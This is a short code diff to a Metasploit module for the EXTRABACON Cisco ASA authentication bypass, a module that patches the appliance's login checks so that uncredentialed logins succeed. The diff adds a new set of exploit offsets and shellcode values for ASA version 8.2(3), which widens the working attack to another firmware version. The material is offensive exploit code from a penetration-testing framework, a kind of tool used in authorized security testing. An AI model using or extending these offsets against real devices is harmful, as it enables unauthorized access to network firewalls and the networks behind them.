@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
       'Description' => %q{
           This module patches the authentication functions of a Cisco ASA
-          to allow uncredentialed logins. Uses improved offsets for payload.
+          to allow uncredentialed logins. Uses improved shellcode for payload.
         },
       'Author'      =>
         [
@@ -49,7 +49,8 @@ class MetasploitModule < Msf::Auxiliary
                    "64.90.8.8",        # admauth_offset, 7
                    "85.137.229.87"],   # admauth_code,   8
 
-      "8.4(3)" => ["13.178.7.8", "150.219.224.8", "72", "0.192.84.9", "208.207.84.9", "85.49.192.137", "0.16.8.8", "208.23.8.8", "85.137.229.87"]
+      "8.4(3)" => ["13.178.7.8", "150.219.224.8", "72", "0.192.84.9", "208.207.84.9", "85.49.192.137", "0.16.8.8", "208.23.8.8", "85.137.229.87"],
+      "8.2(3)" => ["45.0.7.8", "252.42.185.8", "88", "0.96.43.9", "128.111.43.9", "85.49.192.137", "0.240.6.8", "144.241.6.8", "85.137.229.87"]
     }
 
   end
